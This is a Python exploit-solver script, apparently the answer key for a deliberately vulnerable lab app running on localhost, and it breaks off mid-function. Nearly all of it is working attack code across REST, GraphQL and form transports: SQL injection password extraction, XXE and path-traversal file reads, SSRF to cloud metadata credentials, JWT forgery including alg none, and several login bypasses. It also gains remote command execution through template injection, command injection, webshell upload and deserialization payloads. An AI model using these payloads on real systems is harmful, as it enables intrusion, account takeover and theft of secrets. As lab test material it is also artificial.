import urllib.request as U, urllib.parse, urllib.error, json, hmac, hashlib, base64, time, re, subprocess, sys
ROOT = "http://127.0.0.1:8092"; API = ROOT + "/api"
ADM = "root_admin"

def raw(method, p, body=None, headers=None):
    h = dict(headers or {})
    data = None
    if body is not None:
        if isinstance(body, (dict, list)): data = json.dumps(body).encode(); h["Content-Type"] = "application/json"
        else: data = body.encode()
    r = U.Request(API + p, data=data, headers=h, method=method)
    try: x = U.urlopen(r, timeout=15); return x.status, x.read().decode(), dict(x.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode(), dict(e.headers)
    except Exception as e: return 0, str(e), {}
def get(p, headers=None): return raw("GET", p, None, headers)
def post(p, body=None, headers=None): return raw("POST", p, body, headers)
def jparse(t):
    try: return json.loads(t)
    except: return None

def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b"=")
def forge_hs256(secret, payload):
    hd = b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode()); pl = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return (hd + b"." + pl + b"." + b64u(hmac.new(secret.encode(), hd + b"." + pl, hashlib.sha256).digest())).decode()
def forge_none(payload):
    hd = b64u(json.dumps({"alg": "none", "typ": "JWT"}, separators=(",", ":")).encode()); pl = b64u(json.dumps(payload, separators=(",", ":")).encode())
    return (hd + b"." + pl + b".").decode()

INJ = "' UNION SELECT 999,username,password FROM users WHERE username='" + ADM + "'-- "

# blind-bool extraction — the /search handler for `blind-bool` variant returns {found: N}. Binary-search
# each character of the admin password via a truthy AND-clause. Alphabet is printable ASCII sans quote.
def _blind_ok(p, q):
    s, t, _ = get(p + "?q=" + urllib.parse.quote(q))
    d = jparse(t)
    if isinstance(d, dict) and isinstance(d.get("found"), int): return d["found"] > 0
    if isinstance(d, list): return len(d) > 0
    return False

def _blind_bool_extract_password(p, max_len=48):
    chars = ''.join(chr(c) for c in range(0x20, 0x7f) if chr(c) not in "'\"\\%_")
    pw = ''
    for i in range(1, max_len + 1):
        # is there ANY character at position i?
        if not _blind_ok(p, "%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "):
            break
        found = None
        for c in chars:
            q = "%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "
            if _blind_ok(p, q): found = c; break
        if found is None: return None
        pw += found
    return pw or None

def manifest():
    s, t, _ = get("/manifest"); m = jparse(t) or {}
    eps = {}
    for v in m.get("views", []):
        for e in v.get("endpoints", []):
            eps.setdefault(e["kind"], []).append(e["p"])
    return m, eps

def get_user_cred(eps, auth):
    """register + login a normal user -> auth header for a low-priv foothold"""
    for rp in eps.get("register", []):
        un = "u" + str(int(time.time() * 1000) % 1000000)
        post(rp, {"username": un, "password": "pw12345"})
        for lp in eps.get("login", []):
            s, t, h = post(lp, {"username": un, "password": "pw12345"}); c = cred_from_login(auth, t, h)
            if c: return c
    return None

def gather(eps, auth):
    """return dict of leaked facts: password, appkey, adminkey, sid"""
    facts = {}
    # BOLA-read via a normal-user foothold (multi-hop: register -> login -> read admin record)
    lookups = eps.get("user-lookup", [])
    if lookups:
        uc = get_user_cred(eps, auth)
        if uc:
            for lp in lookups:
                s, t, _ = get(lp.replace(":username", ADM), uc); d = jparse(t)
                if isinstance(d, dict):
                    if d.get("password"): facts["password"] = d["password"]
                    if d.get("apikey"): facts["adminkey"] = facts.get("adminkey") or d["apikey"]
    # SQLi via search — try the four variants:
    #  union : rows returned; password is smuggled into `category`
    #  error : rows returned or the raw SQL is echoed in an error body (the injection still yields data via UNION)
    #  blind-bool : /search returns {found: N} — but our UNION still forces N>=1 when true. To recover
    #               the password, we brute-force each character via SUBSTR(...) = 'X'
    #  blind-time : same UNION works; we don't need to rely on timing
    for p in eps.get("search", []):
        s, t, _ = get(p + "?q=" + urllib.parse.quote(INJ)); rows = jparse(t)
        if isinstance(rows, list):
            for r in rows:
                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
        # error-variant fallback: 500 body may carry the query verbatim; extract the injected UNION result
        if not facts.get("password"):
            d = jparse(t)
            if isinstance(d, dict) and isinstance(d.get("query"), str) and "root_admin" in d["query"]:
                # UNION was rejected but the injection was placed — try boolean-style extraction
                pw = _blind_bool_extract_password(p)
                if pw: facts["password"] = pw
        # blind-bool variant returns {"found": N} — cannot piggyback UNION; do char-by-char extraction
        if not facts.get("password") and isinstance(rows, dict) and "found" in rows:
            pw = _blind_bool_extract_password(p)
            if pw: facts["password"] = pw
    # XXE via import
    for p in eps.get("import", []):
        for tgt, key in [("file:///app/config/app.conf", "conf"), ("file:///app/secret/app.key", "appkey")]:
            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
            s, t, _ = post(p, {"xml": xml}); d = jparse(t)
            leak = (d or {}).get("imported", {}).get("customer", "") if isinstance(d, dict) else ""
            if leak:
                mm = re.search(r'admin\.password=(\S+)', leak);  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
                if key == "appkey" and leak.strip() and "password" not in leak: facts["appkey"] = leak.strip()
    # LFI via read
    for p in eps.get("read", []):
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../secret/app.key"))
        if s == 200 and t.strip() and "not found" not in t: facts["appkey"] = t.strip()
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../config/app.conf"))
        mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        s, t, _ = get(p + "?name=" + urllib.parse.quote("../sessions.json"))
        arr = jparse(t)
        if isinstance(arr, list):
            for pair in arr:
                if isinstance(pair, list) and len(pair) == 2 and pair[1] == ADM: facts["sid"] = pair[0]
    # disclosure
    for p in eps.get("docs", []):
        s, t, _ = get(p); d = jparse(t) or {}
        xi = d.get("x-internal") or {}
        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        if d.get("x-admin-key"): facts["adminkey"] = d["x-admin-key"]
    for p in eps.get("backup-file", []):
        s, t, _ = get(p)
        mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        mk = re.search(r'SIGNING_KEY=(\S+)', t or "");  facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
    # variant-distinct disclosure routes: .git/config, .bak, sourcemap
    for kind in ("git-config", "bak", "sourcemap"):
        for p in eps.get(kind, []):
            s, t, _ = get(p)
            if not t: continue
            mm = re.search(r'admin\.password=(\S+)', t or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
            mk = re.search(r'SIGNING_KEY=(\S+)', t or "");      facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
            if kind == "sourcemap":
                # source map: sourcesContent contains [config, appkey]
                d = jparse(t)
                if isinstance(d, dict):
                    sc = d.get("sourcesContent") or []
                    for src in sc:
                        mmp = re.search(r'admin\.password=(\S+)', src or "");  facts["password"] = facts.get("password") or (mmp.group(1) if mmp else None)
                    if len(sc) >= 2 and sc[1] and "password" not in (sc[1] or ""): facts["appkey"] = facts.get("appkey") or sc[1].strip()
    # ssrf-cloudmeta — try the AWS IMDS + GCP metadata URLs against every /fetch endpoint
    for p in eps.get("fetch", []):
        for url in ["http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"]:
            s, t, _ = post(p, {"url": url})
            d = jparse(t)
            if isinstance(d, dict) and d.get("status") == 200:
                inner = jparse(d.get("body") or "") or {}
                key = inner.get("SecretAccessKey") or inner.get("access_token")
                if key: facts["appkey"] = facts.get("appkey") or key
    return facts

def cred_from_login(auth, resp_text, resp_headers):
    d = jparse(resp_text) or {}
    if auth == "jwt" and d.get("token"): return {"Authorization": "Bearer " + d["token"]}
    if auth == "apikey" and d.get("apiKey"): return {"X-API-Key": d["apiKey"]}
    if auth == "session":
        sc = resp_headers.get("Set-Cookie", "");  m = re.search(r'mutie_sid=([^;]+)', sc)
        if m: return {"Cookie": "mutie_sid=" + m.group(1)}
    return None

def admin_creds(eps, auth, facts):
    """yield candidate admin auth-header dicts — HARDER paths first (coverage)"""
    cands = []
    pw = facts.get("password")
    # jwt forge / algnone / weak
    if auth == "jwt":
        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
    if auth == "session":
        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
        if facts.get("sid"): cands.append(("session-file", {"Cookie": "mutie_sid=" + facts["sid"]}))
        # remember-me — either base64(username) or plain username
        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
    if auth == "apikey" and facts.get("adminkey"):
        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
    # login SQLi bypass
    for p in eps.get("login", []):
        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
            s, t, h = post(p, {"username": inj, "password": "x"}); c = cred_from_login(auth, t, h)
            if c: cands.append(("login-bypass", c))
    # reset-weak then login
    for rp in eps.get("reset", []):
        post(rp, {"username": ADM})
        for cp in eps.get("reset-confirm", []):
            s, t, h = post(cp, {"username": ADM, "token": "rt-" + ADM, "password": "pwned123"})
            if s == 200:
                for lp in eps.get("login", []):
                    s2, t2, h2 = post(lp, {"username": ADM, "password": "pwned123"}); c = cred_from_login(auth, t2, h2)
                    if c: cands.append(("reset-weak", c))
    # mass-assignment register admin then login
    for rp in eps.get("register", []):
        un = "pwn" + str(int(time.time() * 1000) % 100000)
        post(rp, {"username": un, "password": "pw12345", "role": "admin"})
        for lp in eps.get("login", []):
            s, t, h = post(lp, {"username": un, "password": "pw12345"}); c = cred_from_login(auth, t, h)
            if c: cands.append(("mass-assign", c))
    # login-as / impersonation — mint an admin credential with no admin check
    for p in eps.get("login-as", []):
        s, t, h = post(p, {"username": ADM}); c = cred_from_login(auth, t, h)
        if c: cands.append(("login-as", c))
    # bola-write — user foothold, overwrite the admin password, then log in as admin
    for p in eps.get("profile-write", []):
        uc = get_user_cred(eps, auth)
        if uc:
            post(p, {"username": ADM, "password": "pwned123"}, uc)
            for lp in eps.get("login", []):
                s, t, h = post(lp, {"username": ADM, "password": "pwned123"}); c = cred_from_login(auth, t, h)
                if c: cands.append(("bola-write", c))
    # login with recovered password (easiest — last)
    for p in eps.get("login", []):
        if pw:
            s, t, h = post(p, {"username": ADM, "password": pw}); c = cred_from_login(auth, t, h)
            if c: cands.append(("creds-login", c))
    return cands

def try_sinks(eps, hdr):
    # ssti — try eval / ejs / triple-brace / pug payloads
    ssti_payloads = [
        "{{ process.mainModule.require('child_process').execSync('id') }}",         # eval
        "<%= process.mainModule.require('child_process').execSync('id') %>",       # ejs
        "{{{ process.mainModule.require('child_process').execSync('id') }}}",     # handlebars (triple)
        "- var cp = require('child_process')\n= cp.execSync('id').toString()",     # pug
    ]
    for p in eps.get("render", []):
        for pl in ssti_payloads:
            s, t, _ = post(p, {"template": pl, "data": {}}, hdr); d = jparse(t)
            if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "ssti"
    # cmdi — inject shell for all four variants (tar/ping/zip/git); each variant uses a different arg
    for p in eps.get("backup", []):
        for body in [{"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"},
                     {"name": "x; id #"}, {"branch": "main; id #"}]:
            s, t, _ = post(p, body, hdr); d = jparse(t)
            if isinstance(d, dict) and "uid=" in str(d.get("log", "")): return "cmdi"
    # upload webshell — try both variants: js-require and ejs-template
    if eps.get("upload") and eps.get("run"):
        payloads = [("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"),
                    ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")]
        for up in eps["upload"]:
            base = up.rsplit("/", 1)[0]
            for fn, content in payloads:
                post(up, {"filename": fn, "content": content}, hdr)
                for rp in eps["run"]:
                    if rp.startswith(base):
                        s, t, _ = post(rp.replace(":name", fn), {}, hdr); d = jparse(t)
                        if isinstance(d, dict) and "uid=" in str(d.get("output", "")): return "upload"
    # deserialization — try node-serialize + funcster payloads
    for p in eps.get("import-job", []):
        for payload in [
            json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
            json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"}),
        ]:
            s, t, _ = post(p, {"job": payload}, hdr); d = jparse(t)
            if isinstance(d, dict) and "uid=" in str(d.get("result", "")): return "deser"
    return None

def try_ssrf(eps):
    for p in eps.get("fetch", []):
        s, t, _ = post(p, {"url": "http://127.0.0.1:9000/token"}); d = jparse(t)
        if isinstance(d, dict) and d.get("status") == 200:
            tok = (jparse(d["body"]) or {}).get("token")
            if tok:
                s2, t2, _ = post(p, {"url": "http://127.0.0.1:9000/run-task", "method": "POST", "headers": {"Content-Type": "application/json", "X-Task-Token": tok}, "body": {"cmd": "id"}}); d2 = jparse(t2)
                if isinstance(d2, dict) and d2.get("status") == 200 and "uid=" in (jparse(d2["body"]) or {}).get("output", ""): return "ssrf->run-task"
    return None

def solve():
    m, eps = manifest(); auth = m.get("auth")
    facts = gather(eps, auth)
    for how, hdr in admin_creds(eps, auth, facts):
        sink = try_sinks(eps, hdr)
        if sink: return True, auth, how, sink
    p = try_ssrf(eps)
    if p: return True, auth, "ssrf", p
    return False, auth, None, None

# ============================================================================
# GraphQL transport solver — mirrors the REST solver but every attack is a POST
# to /graphql. Used when manifest.api === 'graphql'. Auth headers still work
# because the resolvers call the same authmodes.resolve(req) as REST.
# ============================================================================

GQL_URL = ROOT + "/graphql"

def gql(query, variables=None, headers=None):
    body = json.dumps({"query": query, "variables": variables or {}}).encode()
    h = dict(headers or {}); h["Content-Type"] = "application/json"
    r = U.Request(GQL_URL, data=body, headers=h, method="POST")
    try: x = U.urlopen(r, timeout=25); return x.status, x.read().decode(), dict(x.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode(), dict(e.headers)
    except Exception as e: return 0, str(e), {}

def views_by_kind(m):
    by = {}
    for v in m.get("views", []): by.setdefault(v.get("kind"), []).append(v)
    return by

def gql_gather(views):
    """Same facts (password/appkey/adminkey/sid) via /graphql resolvers."""
    facts = {}
    # SQLi via contentSearch
    for v in views.get("content", []):
        q = "query($b:String!,$q:String!){ contentSearch(block:$b, q:$q) }"
        s, t, _ = gql(q, {"b": v["id"], "q": INJ})
        d = jparse(t) or {}
        rows = (d.get("data") or {}).get("contentSearch")
        if isinstance(rows, list):
            for r in rows:
                if isinstance(r, dict) and r.get("name") == ADM and r.get("category"): facts["password"] = r["category"]
        # blind-bool fallback via gql
        if not facts.get("password") and isinstance(rows, dict) and "found" in rows:
            def _ok(qq):
                s2, t2, _ = gql(q, {"b": v["id"], "q": qq}); d2 = jparse(t2) or {}
                r2 = (d2.get("data") or {}).get("contentSearch")
                if isinstance(r2, dict) and isinstance(r2.get("found"), int): return r2["found"] > 0
                if isinstance(r2, list): return len(r2) > 0
                return False
            pw = ""
            for i in range(1, 48):
                if not _ok("%' AND (SELECT length(password) FROM users WHERE username='" + ADM + "') >= " + str(i) + " -- "): break
                found = None
                for c in ''.join(chr(x) for x in range(0x20, 0x7f) if chr(x) not in "'\"\\%_"):
                    if _ok("%' AND (SELECT substr(password," + str(i) + ",1) FROM users WHERE username='" + ADM + "') = '" + c + "' -- "): found = c; break
                if found is None: break
                pw += found
            if pw: facts["password"] = pw
    # XXE via importInvoice
    for v in views.get("import", []):
        q = 'mutation($b:String!,$xml:String!){ importInvoice(block:$b, xml:$xml){ ref customer amount } }'
        for tgt in ("file:///app/config/app.conf", "file:///app/secret/app.key"):
            xml = '<?xml version="1.0"?><!DOCTYPE c [<!ENTITY x SYSTEM "%s">]><invoice><customer>&x;</customer></invoice>' % tgt
            s, t, _ = gql(q, {"b": v["id"], "xml": xml}); d = jparse(t) or {}
            leak = ((d.get("data") or {}).get("importInvoice") or {}).get("customer") or ""
            if leak:
                mm = re.search(r'admin\.password=(\S+)', leak);  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
                if "password" not in leak and leak.strip(): facts["appkey"] = leak.strip()
    # LFI via fileRead
    for v in views.get("fileportal", []):
        q = 'query($b:String!,$n:String!){ fileRead(block:$b, name:$n) }'
        for name, key in (("../secret/app.key", "appkey"), ("../config/app.conf", "conf")):
            s, t, _ = gql(q, {"b": v["id"], "n": name}); d = jparse(t) or {}
            txt = (d.get("data") or {}).get("fileRead") or ""
            if key == "appkey" and txt and "password" not in txt: facts["appkey"] = txt.strip()
            mm = re.search(r'admin\.password=(\S+)', txt or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
    # disclosure via openapi/backupFile
    for v in views.get("disclosure", []):
        s, t, _ = gql('query($b:String!){ openapi(block:$b) }', {"b": v["id"]}); d = jparse(t) or {}
        spec = (d.get("data") or {}).get("openapi") or {}
        xi = spec.get("x-internal") or {}
        if xi.get("signingKey"): facts["appkey"] = xi["signingKey"]
        mm = re.search(r'admin\.password=(\S+)', xi.get("config", "") or "");  facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        if spec.get("x-admin-key"): facts["adminkey"] = spec["x-admin-key"]
        # Swagger example variant: paths./login.post.requestBody.content.application/json.example.password
        try:
            ex = spec["paths"]["/login"]["post"]["requestBody"]["content"]["application/json"]["example"]
            if ex and ex.get("password"): facts["password"] = facts.get("password") or ex["password"]
        except Exception: pass
        s, t, _ = gql('query($b:String!){ backupFile(block:$b) }', {"b": v["id"]}); d = jparse(t) or {}
        bf = (d.get("data") or {}).get("backupFile") or ""
        mm = re.search(r'admin\.password=(\S+)', bf); facts["password"] = facts.get("password") or (mm.group(1) if mm else None)
        mk = re.search(r'SIGNING_KEY=(\S+)', bf);      facts["appkey"] = facts.get("appkey") or (mk.group(1) if mk else None)
    # BOLA via userLookup — multi-hop: register/login as user, then read the admin record
    for v in views.get("account", []):
        un = "u" + str(int(time.time() * 1000) % 1000000)
        s, t, _ = gql('mutation($b:String!,$u:String!,$p:String!){ register(block:$b, username:$u, password:$p){ ok } }', {"b": v["id"], "u": un, "p": "pw12345"})
        # login and derive credential
        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un, "p": "pw12345"})
        d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
        cred = gql_cred_from_login(li, h)
        if cred:
            s2, t2, _ = gql('query($b:String!,$u:String!){ userLookup(block:$b, username:$u){ username role email password apikey } }', {"b": v["id"], "u": ADM}, cred)
            d2 = jparse(t2) or {}
            ul = (d2.get("data") or {}).get("userLookup") or {}
            if ul.get("password"): facts["password"] = ul["password"]
            if ul.get("apikey"): facts["adminkey"] = facts.get("adminkey") or ul["apikey"]
    # SSRF cloud metadata
    for v in views.get("webhook", []):
        for url in ("http://169.254.169.254/latest/meta-data/iam/security-credentials/role",
                    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"):
            s, t, _ = gql('mutation($b:String!,$u:String!){ fetch(block:$b, url:$u, method:"GET", headers:{}, body:{}){ status body } }', {"b": v["id"], "u": url})
            d = jparse(t) or {}; fr = (d.get("data") or {}).get("fetch") or {}
            if fr.get("status") == 200:
                inner = jparse(fr.get("body") or "") or {}
                key = inner.get("SecretAccessKey") or inner.get("access_token")
                if key: facts["appkey"] = facts.get("appkey") or key
    return facts

def gql_cred_from_login(li, headers):
    if li.get("token"): return {"Authorization": "Bearer " + li["token"]}
    if li.get("apiKey"): return {"X-API-Key": li["apiKey"]}
    sc = headers.get("Set-Cookie", "");  m = re.search(r'mutie_sid=([^;]+)', sc)
    if m: return {"Cookie": "mutie_sid=" + m.group(1)}
    return None

def gql_admin_creds(views, auth, facts):
    cands = []
    if auth == "jwt":
        payload = {"username": ADM, "role": "admin", "exp": int(time.time()) + 3600}
        if facts.get("appkey"): cands.append(("jwt-forge", {"Authorization": "Bearer " + forge_hs256(facts["appkey"], payload)}))
        cands.append(("jwt-algnone", {"Authorization": "Bearer " + forge_none({"username": ADM, "role": "admin"})}))
        cands.append(("jwt-weak", {"Authorization": "Bearer " + forge_hs256("secret", payload)}))
    if auth == "session":
        cands.append(("session-predict", {"Cookie": "mutie_sid=s-1000"}))
        cands.append(("remember-me-b64", {"Cookie": "mutie_remember=" + base64.b64encode(ADM.encode()).decode()}))
        cands.append(("remember-me-plain", {"Cookie": "mutie_remember=" + ADM}))
    if auth == "apikey" and facts.get("adminkey"):
        cands.append(("apikey-leak", {"X-API-Key": facts["adminkey"]}))
    # login-bypass via SQLi in login args
    for v in views.get("account", []):
        for inj in [ADM + "' -- ", "' OR role='admin' -- "]:
            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": inj, "p": "x"})
            d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
            c = gql_cred_from_login(li, h)
            if c: cands.append(("login-bypass", c))
        # reset-weak
        s, t, _ = gql('mutation($b:String!,$u:String!){ reset(block:$b, username:$u) }', {"b": v["id"], "u": ADM})
        for cp in ["rt-" + ADM]:
            s2, t2, _ = gql('mutation($b:String!,$u:String!,$t:String!,$p:String!){ resetConfirm(block:$b, username:$u, token:$t, password:$p) }', {"b": v["id"], "u": ADM, "t": cp, "p": "pwned123"})
            d2 = jparse(t2) or {}
            if not (d2.get("errors")):
                s3, t3, h3 = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": "pwned123"})
                d3 = jparse(t3) or {}; li3 = ((d3.get("data") or {}).get("login") or {})
                c = gql_cred_from_login(li3, h3)
                if c: cands.append(("reset-weak", c))
        # mass-assignment: register admin then login
        un = "pwn" + str(int(time.time() * 1000) % 100000)
        gql('mutation($b:String!,$u:String!,$p:String!,$r:String!){ register(block:$b, username:$u, password:$p, role:$r){ ok } }', {"b": v["id"], "u": un, "p": "pw12345", "r": "admin"})
        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un, "p": "pw12345"})
        d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
        c = gql_cred_from_login(li, h)
        if c: cands.append(("mass-assign", c))
        # login-as / impersonation
        s, t, h = gql('mutation($b:String!,$u:String!){ loginAs(block:$b, username:$u){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM})
        d = jparse(t) or {}; la = ((d.get("data") or {}).get("loginAs") or {})
        c = gql_cred_from_login(la, h)
        if c: cands.append(("login-as", c))
        # bola-write: register/login a user, overwrite the admin password, then log in as admin
        un2 = "uw" + str(int(time.time() * 1000) % 1000000)
        gql('mutation($b:String!,$u:String!,$p:String!){ register(block:$b, username:$u, password:$p){ ok } }', {"b": v["id"], "u": un2, "p": "pw12345"})
        s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": un2, "p": "pw12345"})
        d = jparse(t) or {}; ucred = gql_cred_from_login(((d.get("data") or {}).get("login") or {}), h)
        if ucred:
            gql('mutation($b:String!,$u:String!,$p:String!){ profileWrite(block:$b, username:$u, password:$p) }', {"b": v["id"], "u": ADM, "p": "pwned123"}, ucred)
            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": "pwned123"})
            d = jparse(t) or {}; c = gql_cred_from_login(((d.get("data") or {}).get("login") or {}), h)
            if c: cands.append(("bola-write", c))
        # creds-login with recovered password
        if facts.get("password"):
            s, t, h = gql('mutation($b:String!,$u:String!,$p:String!){ login(block:$b, username:$u, password:$p){ token apiKey user{ username role } } }', {"b": v["id"], "u": ADM, "p": facts["password"]})
            d = jparse(t) or {}; li = ((d.get("data") or {}).get("login") or {})
            c = gql_cred_from_login(li, h)
            if c: cands.append(("creds-login", c))
    return cands

def gql_try_sinks(views, hdr):
    ssti_payloads = [
        "{{ process.mainModule.require('child_process').execSync('id') }}",
        "<%= process.mainModule.require('child_process').execSync('id') %>",
        "{{{ process.mainModule.require('child_process').execSync('id') }}}",
        "- var cp = require('child_process')\n= cp.execSync('id').toString()",
    ]
    for v in views.get("adminreport", []):
        for pl in ssti_payloads:
            s, t, _ = gql('mutation($b:String!,$tpl:String!){ render(block:$b, template:$tpl, data:{}){ output } }', {"b": v["id"], "tpl": pl}, hdr)
            d = jparse(t) or {}; out = ((d.get("data") or {}).get("render") or {}).get("output") or ""
            if "uid=" in out: return "ssti"
    for v in views.get("adminbackup", []):
        for body in ({"name": "x.tgz; id #"}, {"host": "127.0.0.1; id #"}, {"name": "x; id #"}, {"branch": "main; id #"}):
            fields = ",".join([k + ":$" + k for k in body.keys()])
            variables = {"b": v["id"], **body}
            arg_defs = ",".join(["$" + k + ":String" for k in body.keys()])
            s, t, _ = gql('mutation($b:String!,' + arg_defs + '){ backup(block:$b,' + fields + '){ ok log } }', variables, hdr)
            d = jparse(t) or {}; log = ((d.get("data") or {}).get("backup") or {}).get("log") or ""
            if "uid=" in log: return "cmdi"
        # deserialization via importJob
        for payload in (
            json.dumps({"name": "_$$ND_FUNC$$_function(){ return require('child_process').execSync('id').toString() }()"}),
            json.dumps({"__js_function": "function(){ return process.mainModule.require('child_process').execSync('id').toString() }"}),
        ):
            s, t, _ = gql('mutation($b:String!,$j:String!){ importJob(block:$b, job:$j) }', {"b": v["id"], "j": payload}, hdr)
            d = jparse(t) or {}; result = (d.get("data") or {}).get("importJob") or {}
            if "uid=" in str(result): return "deser"
    # upload webshell via uploadExt + runExt
    upload_hosts = views.get("fileportal", []) + views.get("adminupload", [])
    for v in upload_hosts:
        for fn, content in (("s.js", "module.exports=()=>require('child_process').execSync('id').toString()"),
                            ("t.ejs", "<%= process.mainModule.require('child_process').execSync('id') %>")):
            gql('mutation($b:String!,$fn:String!,$c:String!){ uploadExt(block:$b, filename:$fn, content:$c){ ok } }', {"b": v["id"], "fn": fn, "c": content}, hdr)
            s, t, _ = gql('mutation($b:String!,$n:String!){ runExt(block:$b, name:$n){ output } }', {"b": v["id"], "n": fn}, hdr)
            d = jparse(t) or {}; out = ((d.get("data") or {}).get("runExt") or {}).get("output") or ""
            if "uid=" in out: return "upload"
    return None

def gql_try_ssrf(views):
    for v in views.get("webhook", []):
        s, t, _ = gql('mutation($b:String!,$u:String!){ fetch(block:$b, url:$u, method:"GET", headers:{}, body:{}){ status body } }', {"b": v["id"], "u": "http://127.0.0.1:9000/token"})
        d = jparse(t) or {}; fr = (d.get("data") or {}).get("fetch") or {}
        if fr.get("status") == 200:
            tok = (jparse(fr.get("body") or "") or {}).get("token")
            if tok:
                s2, t2, _ = gql('mutation($b:String!,$u:String!,$h:JSON!,$body:JSON!){ fetch(block:$b, url:$u, method:"POST", headers:$h, body:$body){ status body } }',
                                {"b": v["id"], "u": "http://127.0.0.1:9000/run-task", "h": {"Content-Type": "application/json", "X-Task-Token": tok}, "body": {"cmd": "id"}})
                d2 = jparse(t2) or {}; fr2 = (d2.get("data") or {}).get("fetch") or {}
                if fr2.get("status") == 200 and "uid=" in (jparse(fr2.get("body") or "") or {}).get("output", ""): return "ssrf->run-task"
    return None

def solve_gql(m):
    views = views_by_kind(m); auth = m.get("auth")
    facts = gql_gather(views)
    for how, hdr in gql_admin_creds(views, auth, facts):
        sink = gql_try_sinks(views, hdr)
        if sink: return True, auth, how + "|gql", sink
    p = gql_try_ssrf(views)
    if p: return True, auth, "ssrf|gql", p
    return False, auth, None, None

# ============================================================================
# Traditional transport solver — mirrors the REST solver but every attack is a server-rendered HTML
# page. Forms submit x-www-form-urlencoded to /b/<slug>/<op>; each page embeds the raw result as a
# <script type="application/json" id="mj"> blob, which we parse. Used when manifest.api === 'traditional'.
# ============================================================================

def trad_get(path, headers=None):
    r = U.Request(ROOT + path, headers=dict(headers or {}), method="GET")
    try: x = U.urlopen(r, timeout=20); return x.status, x.read().decode('utf-8', 'replace'), dict(x.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e: return 0, str(e), {}

def trad_post(path, fields, headers=None):
    data = urllib.parse.urlencode(fields).encode()
    h = dict(headers or {}); h["Content-Type"] = "application/x-www-form-urlencoded"
    r = U.Request(ROOT + path, data=data, headers=h, method="POST")
    try: x = U.urlopen(r, timeout=25); return x.status, x.read().decode('utf-8', 'replace'), dict(x.headers)
    except urllib.error.HTTPError as e: return e.code, e.read().decode('utf-8', 'replace'), dict(e.headers)
    except Exception as e: return 0, str(e), {}

def mj(html):
    m = re.search(r'<script type="application/json" id="mj">(.*?)</script>', html or '', re.S)
    if not m: return None
    try: return json.loads(m.group(1))
    except: return None

def _trad_blind_ok(slug, q):
    s, t, _ = trad_get("/b/" + slug + "/search?q=" + urllib.parse.quote(q)); d = mj(t)
    if isinstance(d, dict) and isinstance(d.get("found"), int): return d["found"] > 0
    if isinstance(d, list): return len(d) > 0
    return False

def _trad_blind_pw(slug):
